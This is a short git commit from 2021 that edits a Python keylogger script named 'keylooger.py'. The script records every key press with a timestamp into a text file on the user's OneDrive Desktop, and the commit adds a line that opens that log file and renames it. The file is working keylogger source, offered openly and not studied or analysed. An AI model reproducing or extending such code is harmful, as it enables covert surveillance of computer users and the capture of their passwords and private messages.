b5737552423147b5e536c74ed62baceb52be9394
ajay-navaneethan <68010850+ajay-navaneethan@users.noreply.github.com>
2021-07-02 11:16:16 +0530

    v1.1 added file creation

--- keylooger.py
+++ keylooger.py
@@ -5,8 +5,9 @@ from shutil import copyfile
 
 username = os.getlogin()
 logging_directory = f"C:/Users/{username}/OneDrive/Desktop"
+file = open(f"C:/Users/{username}/OneDrive/Desktop/logs.txt","w")
 
-logging.basicConfig(filename=f"{logging_directory}/log.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
+logging.basicConfig(filename=f"{logging_directory}/logs.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")
 def key_handler(key):
     logging.info(key)
 with Listener(on_press =key_handler) as listener:
